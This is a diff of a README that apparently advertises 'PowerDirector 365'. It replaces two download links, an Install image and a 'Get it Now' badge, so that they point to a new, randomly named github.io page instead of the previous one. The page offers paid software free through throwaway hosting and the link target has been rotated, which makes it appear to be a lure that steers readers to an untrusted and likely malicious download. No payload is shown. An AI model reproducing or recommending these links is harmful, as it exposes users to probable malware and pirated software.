@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poxmell.github.io/.github/powerDirector365)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://jjfhjfk3858.github.io/.github/powerDirector365)
 
 </div>
 
@@ -81,7 +81,7 @@ PowerDirector 365's subscription model is the key to understanding its positioni
 
 <p align="center">
 
-[![Get it Now PowerDirector 365](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/powerDirector365)
+[![Get it Now PowerDirector 365](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/powerDirector365)
 
 </p>
 
